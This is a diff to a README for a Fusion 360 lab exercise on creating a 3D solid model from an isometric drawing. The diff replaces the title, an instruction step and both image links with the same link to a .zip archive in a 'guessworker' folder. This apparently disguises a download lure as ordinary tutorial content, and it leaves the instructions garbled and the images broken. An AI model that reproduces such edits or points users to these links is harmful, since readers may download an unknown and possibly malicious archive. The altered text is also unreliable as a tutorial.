@@ -1,4 +1,4 @@
-# EX.No.2.1  CREATE A 3D SOLID MODEL FROM ISOMETRIC DRAWING
+# https://raw.githubusercontent.com/24013396/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING/main/guessworker/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING-1.1.zip  CREATE A 3D SOLID MODEL FROM ISOMETRIC DRAWING
 ## Date:
 
 ## AIM
@@ -62,16 +62,16 @@ To create a 3Dmodel from the given isometric drawing using fusion 360 tool.
    Select the TOP SURFACE OF RECTANGLE.
    
  ### STEP-11: Create a line
-	1.Select Line command.
+	https://raw.githubusercontent.com/24013396/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING/main/guessworker/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING-1.1.zip Line command.
 	2. Draw the projections in the diagram 
 	3. Click Finish Sketch.
 	4. extrude the sketch.
 
 ## INPUT
-![image](https://user-images.githubusercontent.com/113594316/198495472-9a69edb1-f0c6-470c-b9ae-fe282fa6a678.png)
+![image](https://raw.githubusercontent.com/24013396/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING/main/guessworker/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING-1.1.zip)
 
 ## OUTPUT
-![Screenshot 2024-11-11 110526](https://github.com/user-attachments/assets/aa05af59-7bc6-46af-a4e3-ac7aec8437e3)
+![Screenshot 2024-11-11 110526](https://raw.githubusercontent.com/24013396/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING/main/guessworker/EX.No.2.1-CREATE-A-3D-SOLID-MODEL-FROM-ISOMETRIC-DRAWING-1.1.zip)
 
 ## RESULT: 
  Thus, the 3D model is created from given isometric drawing.
